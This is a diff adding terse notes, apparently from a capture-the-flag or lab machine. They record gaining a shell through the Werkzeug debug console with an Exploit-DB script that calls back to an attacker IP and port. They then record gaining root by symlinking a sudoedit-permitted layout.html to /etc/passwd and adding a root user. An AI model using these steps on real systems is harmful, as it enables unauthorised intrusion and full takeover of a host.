@@ -1,0 +1,20 @@
+Werkzeug - 'Debug Shell' Command Execution - https://www.exploit-db.com/exploits/43905
+
+python werkzeug.py 10.3.3.201 5000 IP PORT
+
+privesc:
+
+sudo -l
+root (NO PASSWD) /var/www/html/werkzeug-master/examples/*/*/layout.html
+
+cd /var/www/html/werkzeug-master/examples/werkzeug-tmp/
+
+mkdir qwe 
+cd qwe
+touch layout.html
+
+ln -sf /etc/passwd /var/www/html/werkzeug-master/examples/werkzeug-tmp/qwe/layout.html
+
+sudoedit /var/www/html/werkzeug-master/examples/werkzeug-tmp/qwe/layout.html
+
+add root user at the end of file
